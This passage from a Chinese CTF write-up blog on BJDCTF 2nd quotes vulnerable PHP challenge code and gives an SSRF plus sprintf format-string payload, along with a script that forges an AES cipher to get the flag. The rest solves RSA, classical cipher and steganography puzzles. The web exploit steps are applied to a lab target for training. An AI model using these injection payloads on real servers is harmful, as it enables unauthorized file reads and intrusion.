class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>home.php( 主要是对home这个页面的file参数做限制,只能包含home和system)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123; <span class="comment">// 文件路径不能出现 ^ ~ &amp; |</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123; <span class="comment">//  匹配flag</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;  <span class="comment">// 匹配 admin</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123; <span class="comment">// 在开头或者结尾 匹配home</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;禁止套娃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>; <span class="comment">// 结尾匹配home 和 system</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;现在访问的是 &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是我们还差 admin.php 的源码, 必须想办法去读,通过读上面的源码,只有system.php中的<code>file_get_contents()</code> 可以进行文件操作,并且包含的是URL中文件, 那么可以利用这里来SSRF读文件, q2,q3 这两个参数分别传入$url和$method; q1 这个参数其实没用</p>
<p>q1 随便, <code>q2=http://127.0.0.1/admin.php?</code>  <code>q3=GET%1$s</code> </p>
<p>q3 这样处理是利用了 sprintf()的格式化漏洞, 这里的method直接和%d连起来的,所以就需要把%d转义掉, 对于sprintf()函数,对%转义的方法是使用两个 % </p>
<p>详细可参考 <a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2097.html#adminphp">https://www.gem-love.com/ctf/2097.html#adminphp</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11209024.html">https://www.cnblogs.com/20175211lyz/p/11209024.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41185953/article/details/80485075">https://blog.csdn.net/weixin_41185953/article/details/80485075</a></p>
<blockquote>
<p>可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：<br> 没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空<br> 因此sprintf注入，或者说php格式化字符串注入的原理为：<br> 要明白%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323174752.png"></p>
<p>这里可以看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check()) &#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher) &#123;</span><br></pre></td></tr></table></figure>

<p>我们传的 decrypt 的值如果和 cipher 全等 那么就输出flag了 跟进$data ,发现是<code>$_SESSION[&#39;secret&#39;]</code> 继续跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">mt_srand(rand(<span class="number">0</span>, <span class="number">9999999</span>));</span><br><span class="line">$length = mt_rand(<span class="number">40</span>, <span class="number">80</span>);</span><br><span class="line">$_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br></pre></td></tr></table></figure>

<p>很明显,这个secret 是没办法算的(虽然mt_srand再知道了seed的情况下是伪加密的),但是这里用了rand()随机函数,故不可能了,继续审计代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们把$data 置空,然后把session删除, 那么这个函数的返回值中就不含data的影响了,就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="string">&#x27;174.0.222.75&#x27;</span>;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="string">&#x27;y1ng&#x27;</span>;</span><br><span class="line">$decrypt = aesEn($data, $key);</span><br><span class="line"><span class="keyword">echo</span> $decrypt;</span><br><span class="line"><span class="comment">// 70klfZeYC+WlC045CcKhtg==</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323192418.png"></p>
<h2 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h2><p>-.-迷~  哦豁,放了hint , hex2bin<del>~</del> 查看源码, 把id hex转asci 得到<code>Po.php</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323144208.png"></p>
<p>写个脚本跑页面,访问跑出来的页面得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200323144524.png"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>比赛期间,只做了两个rsa 的题和猪圈密码变种,挺简单的,然后今天3.24来做一些没做的(包括后面的misc),主要是扩展自己的知识面</p>
<h2 id="BJDCTF-2nd-rsa0"><a href="#BJDCTF-2nd-rsa0" class="headerlink" title="[BJDCTF 2nd]rsa0"></a>[BJDCTF 2nd]rsa0</h2><p>nc 连上,得到题目</p>
<p>e = 16764599</p>
<p>p+q=21239340506817311459186787572468027267132850746194105567223866920337856323361441857876387265619930405182924153876567882484918130471024501693603814804746058</p>
<p>p-q=-5048031029637335149231191408415684148226662140092917448995972746624976215248095110946913521204208015076635059078236543132503940975765908191305189345566924</p>
<p>c=94199730855083732730965469622820082506490337632707475507972203610690286159401380473761769340887752410524025334557253721487209298067423132630158092895169520321692890844213989592942829734748437055734585764387779807087313859629235740948643591454715586781467011464104632685876903024005530278909575346611222495845</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p+q-p+q&#x3D;2q&#x3D;16191309477179976309955596164052343118906188606101188118227894173712880108113346746929473744415722390106289094798331339352414189495258593502298625459179134</span><br></pre></td></tr></table></figure>

<p>q=8095654738589988154977798082026171559453094303050594059113947086856440054056673373464736872207861195053144547399165669676207094747629296751149312729589567</p>
<p>p=13143685768227323304208989490441855707679756443143511508109919833481416269304768484411650393412069210129779606477402212808711035723395204942454502075156491</p>
<p>然后写脚本跑就行了</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200322101053.png"></p>
<h2 id="BJDCTF-2nd-rsa1"><a href="#BJDCTF-2nd-rsa1" class="headerlink" title="[BJDCTF 2nd]rsa1"></a>[BJDCTF 2nd]rsa1</h2><p>同样的,nc 连上得到题目</p>
<p>e=16145567</p>
<p>p^2+q^2=302056540010581605812343282866422417922363365693134864435769924426911775501252262882683414964805518076674602666442401987470324522929339761458390472931991413783186335604185056581777414496417896507705100059997425845872566103242468964844873400097654486379492067062173235314100822197432836403815227974265720509818</p>
<p>p-q=-1431851627204438296618418450210406162738206580676536495446202627698185764667756481486813197172186248178440919468859456786076389793643062157350287579628394</p>
<p>c=114404002011132831130901473953341270383063888045893140794271707322011408265731598820386633519494023154679599957538077728451268662360468787862276201213182292173077965489229541017162160962036998999867852268466142257768510369700607595615732405516305321462776441721248553277253363447794319377298483751351128875318</p>
<p>唯一的不同就是在求p,q 上了 , 其他都一样, 这里多谢<a target="_blank" rel="noopener" href="http://xun9er.com/">@xun9er</a>的提醒…</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200322111908.jpg"></p>
<p>求出 p+q的完全平方 :</p>
<p>602062880938835213880376388603519418287097281716745281887075517218197455075458233154925431989255530483184740110415871111490733800861655691399410572879386011358181293121051877298465038810263357180315010462918785356404592314887266244525864067087260983714856513385685636733425702303525798811016821481300310000400</p>
<p>脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">t = <span class="number">2</span></span><br><span class="line">m = <span class="number">302056540010581605812343282866422417922363365693134864435769924426911775501252262882683414964805518076674602666442401987470324522929339761458390472931991413783186335604185056581777414496417896507705100059997425845872566103242468964844873400097654486379492067062173235314100822197432836403815227974265720509818</span></span><br><span class="line">n = <span class="number">1431851627204438296618418450210406162738206580676536495446202627698185764667756481486813197172186248178440919468859456786076389793643062157350287579628394</span></span><br><span class="line">s = (m * t) - (n ** t)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>

<p>开平方</p>
<p>得到 p+q:</p>
<p>24536969677179682529412128245508274341807935893991850262037490999760875074107697814360845833866295314530525742556923911327074258723616081767043343445250020</p>
<p>计算p和q</p>
<p>p+q-p+q=2Q=23105118049975244232793709795297868179069729313315313766591288372062689309439941332874032636694109066352084823088064454540997868929973019609693055865621626</p>
<p>除以2: 得到q :</p>
<p>11552559024987622116396854897648934089534864656657656883295644186031344654719970666437016318347054533176042411544032227270498934464986509804846527932810813</p>
<p>算p:</p>
<p>12984410652192060413015273347859340252273071237334193378741846813729530419387727147923829515519240781354483331012891684056575324258629571962196815512439207</p>
<p>p q e c 知道了 直接上脚本 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = <span class="number">12984410652192060413015273347859340252273071237334193378741846813729530419387727147923829515519240781354483331012891684056575324258629571962196815512439207</span></span><br><span class="line">q = <span class="number">11552559024987622116396854897648934089534864656657656883295644186031344654719970666437016318347054533176042411544032227270498934464986509804846527932810813</span></span><br><span class="line">e = <span class="number">16145567</span></span><br><span class="line">c = <span class="number">114404002011132831130901473953341270383063888045893140794271707322011408265731598820386633519494023154679599957538077728451268662360468787862276201213182292173077965489229541017162160962036998999867852268466142257768510369700607595615732405516305321462776441721248553277253363447794319377298483751351128875318</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = (gmpy2.invert(e, phi))</span><br><span class="line">n = p * q</span><br><span class="line">s = pow(c, d, n)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(s)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>

<p>最后推荐一个求大数的软件 <strong>King Large  Number Calculator</strong></p>
<p>数太大了 , 在python里面好像算不出来</p>
<h2 id="BJDCTF-2nd-灵能精通-y1ng"><a href="#BJDCTF-2nd-灵能精通-y1ng" class="headerlink" title="[BJDCTF 2nd]灵能精通-y1ng"></a>[BJDCTF 2nd]灵能精通-y1ng</h2><p>得到一个jpg文件, 增加.jpg后缀, 第一眼看好像是猪圈密码, 但是这个有不同的, 后面知道了是猪圈🐖密码的变种(圣堂武士密码)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zmx2473162621/article/details/103949134/">https://blog.csdn.net/zmx2473162621/article/details/103949134/</a></p>
<p>照着里面的图片读就行了 0.0</p>
<h2 id="BJDCTF-2nd-cat-flag"><a href="#BJDCTF-2nd-cat-flag" class="headerlink" title="[BJDCTF 2nd]cat_flag"></a>[BJDCTF 2nd]cat_flag</h2><p>吃到鸡腿为1 没吃到鸡腿为0 ,二进制转字符串</p>
<p><a target="_blank" rel="noopener" href="http://www.nicetool.net/app/binary_convert.html">http://www.nicetool.net/app/binary_convert.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF-2nd-老文盲了"><a href="#BJDCTF-2nd-老文盲了" class="headerlink" title="[BJDCTF 2nd]老文盲了"></a>[BJDCTF 2nd]老文盲了</h2><p>中文生僻字发音,, 从题目知道是文盲,那么👂应该可以听,….</p>
<p><a target="_blank" rel="noopener" href="http://www.duchulai.com/">www.duchulai.com</a> 听就好了</p>
<h2 id="BJDCTF-2nd-Y1nglish-y1ng"><a href="#BJDCTF-2nd-Y1nglish-y1ng" class="headerlink" title="[BJDCTF 2nd]Y1nglish-y1ng#"></a>[BJDCTF 2nd]Y1nglish-y1ng#</h2><p>题目描述: Y1ng根据English居然独自发明了一门语言，就叫Y1nglish</p>
<p>明文都是可读的英文单词，flag如果提交失败，自己读一下，把错误的单词修正，再提交(某个地方的u和i不需要调换顺序，错误点不在那里)</p>
<p>下载附件: 得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.</span><br><span class="line">Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot&#39;d z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf&#39;o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. &#39;Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,&#39; Pzffw ozqh,&#39;os tsn wse azt czw usf lw hqttkf!&#39; Tsn q nqbb vqjk wse npzd wse nztd.</span><br><span class="line">MIH&#123;cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw&#125;</span><br></pre></td></tr></table></figure>

<p>一看这最后一行的格式, 直接令MIH=BJD 跑一下<a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&#39;t a Japanese name but he is really a Japanese. Harry woryed in a lawyer&#39;s office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. &#39;I have never borrrowed any money from you,&#39; Harry said,&#39;so now you can pay for my dinner!&#39; Now i will give you what you want. BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</span><br></pre></td></tr></table></figure>

<p>Just as the mentioned above , we change y to k , that’s the correct flag~</p>
<h2 id="BJDCTF-2nd-燕言燕语-y1ng"><a href="#BJDCTF-2nd-燕言燕语-y1ng" class="headerlink" title="[BJDCTF 2nd]燕言燕语-y1ng"></a>[BJDCTF 2nd]燕言燕语-y1ng</h2><p>hex 转 字符串</p>
<p>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>维吉尼亚密码是在<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒密码</a>基础上产生的一种加密方法，它将凯撒密码的全部25种位移排序为一张表，与原字母序列共同组成26行及26列的字母表。另外，维吉尼亚密码必须有一个密钥，这个密钥由字母组成，最少一个，最多可与明文字母数量相等。维吉尼亚密码加密方法示例如下：</p>
<p>明文：I’ve got it.<br>    密钥：ok</p>
<p>密文：W’fs qcd wd.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>MISC 是今天做的 3.24, 因为大部分Web 选手都会做一点Misc.. 我也不能掉队0.0</p>
<h2 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h2><p>查看图片信息, 1000*500 把高度改为1000即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200324141956.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34281477/article/details/92002276">https://blog.csdn.net/weixin_34281477/article/details/92002276</a></p>
<h2 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h2><p>直接在Winhex 打开 搜索BJD就出来了…这图片真好看</p>
<h2 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h2><p>下载一个图片,但是这个图片接近了20M .那么可以肯定是图片隐写了 binwalk 一波 ,但是为什么我找不到到压缩包 ..</p>
<h2 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h2><p>开局一张图，flag全靠<strong>猜</strong></p>
<p>新版与佛论禅, outguess 隐写(从猜字可以得到)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@1fonlys-kali:~&#x2F;outguess# .&#x2F;outguess -k gemlove -r 1.jpg -t flag.txt</span><br><span class="line">Reading 1.jpg....</span><br><span class="line">Extracting usable bits:   16072 bits</span><br><span class="line">Steg retrieve: seed: 217, len: 35</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇wp 也写的比较水, 后面会综合网上各位师傅的文章来详细补充的</p>
<p>一定要重视python 写脚本这个点, 如果这个点不好, 会影响巨大, 比如那个post 盲注我就还不知道该咋写, 平时还是练少了</p>
<p>这次前面几个题都比较简单, jio本小子 一把梭…但是还是要去体会背后的原理, 然后不要把思维固化, 多总结一些tricks…以及一些工具</p>
<p>这次只做了这些, 其他题没看. 有空去玩玩misc和crypto… </p>
<p>其实如果不是出题人中途放hint, 后面有几个题 比如元素周期表和XSS之光估计是打不出来的,,还是要多做多总结,另外多学习一些姿势,虚心向师傅们请教!</p>
<p>奥利给!!!</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200324000215.png" alt="我比赛期间其实就只做了5道题,嘿嘿还上了Web榜前50"></p>
<p>第一天web只做了5个题(其实jio本小子很快的,然后一直在搜关于ASP.NET, 和POST 布尔盲注,,结果后面还有简单一点的题,第二天如果思维不那么局限的话,再做出3个题是没问题了,就差最后一公里 , <strong>学习为主</strong></p>
<p>下一步的计划: </p>
<ul>
<li>看最近的各位师傅的WP, 主要看和自己思路上的不同,已经技巧的使用</li>
<li>红日安全的代码审计项目走起来</li>
<li>SQLi-labs  1-5 (不要用Sqlmap, 因为自己写脚本的能力太弱了)</li>
<li>继续挖公益SRC, 至少出一个低危(嘿嘿已经有1个中危和1个低危了)</li>
<li>继续学习C 语言, 如果时间允许, 再学一点DOS命令</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/3505.html">https://hack-for.fun/3505.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/4e44.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">搭建CTFd平台的爬坑记录</div></div></a></div><div class="next-post pull-right"><a href="/fcb6.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">C 语言的救赎之路</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">m0nk3y</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-fake-google"><span class="toc-number">1.1.</span> <span class="toc-text">[BJDCTF 2nd]fake google</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-old-hack"><span 